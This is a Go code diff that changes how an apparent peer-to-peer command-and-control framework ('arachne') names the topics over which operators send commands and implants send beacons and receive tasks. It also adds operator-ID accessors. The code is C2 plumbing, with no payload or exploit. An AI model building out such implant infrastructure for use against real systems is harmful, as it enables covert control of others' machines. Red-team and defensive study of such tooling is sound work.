@@ -71,20 +71,21 @@ func (m *Messenger) KnownImplant(peerID string) crypto.PubKey {
 }
 
 // CommandTopic returns the topic where operators publish commands.
-// Both sides derive this from the operator's PeerID.
+// Format: /arachne/<operator-peerid>/commands
 func (m *Messenger) CommandTopic() string {
-	return CommandTopicPrefix + m.operatorID.String()
+	return CommandTopicPrefix + m.operatorID.String() + CommandsSuffix
 }
 
 // BeaconTopic returns the topic where implants publish beacons.
-// Both sides derive this from the operator's PeerID.
+// Format: /arachne/<operator-peerid>/beacons
 func (m *Messenger) BeaconTopic() string {
-	return BeaconTopicPrefix + m.operatorID.String()
+	return BeaconTopicPrefix + m.operatorID.String() + BeaconsSuffix
 }
 
 // TaskTopic returns a per-implant topic for targeted commands.
+// Format: /arachne/<operator-peerid>/tasks/<implant-peerid>
 func (m *Messenger) TaskTopic(implantPeerID string) string {
-	return TaskTopicPrefix + implantPeerID
+	return BeaconTopicPrefix + m.operatorID.String() + TasksSuffix + implantPeerID
 }
 
 func VerifyEnvelope(env *arachnepb.Envelope, trustedPub crypto.PubKey) error {
@@ -205,4 +206,12 @@ func (m *Messenger) CreateEnvelope(msgType uint32, data []byte) *arachnepb.Envel
 
 func (m *Messenger) RendezvousString() string {
 	return "arachne/" + m.operatorID.String()
+}
+
+func (m *Messenger) OperatorID() peer.ID {
+	return m.operatorID
+}
+
+func (m *Messenger) SetOperatorID(id peer.ID) {
+	m.operatorID = id
 }
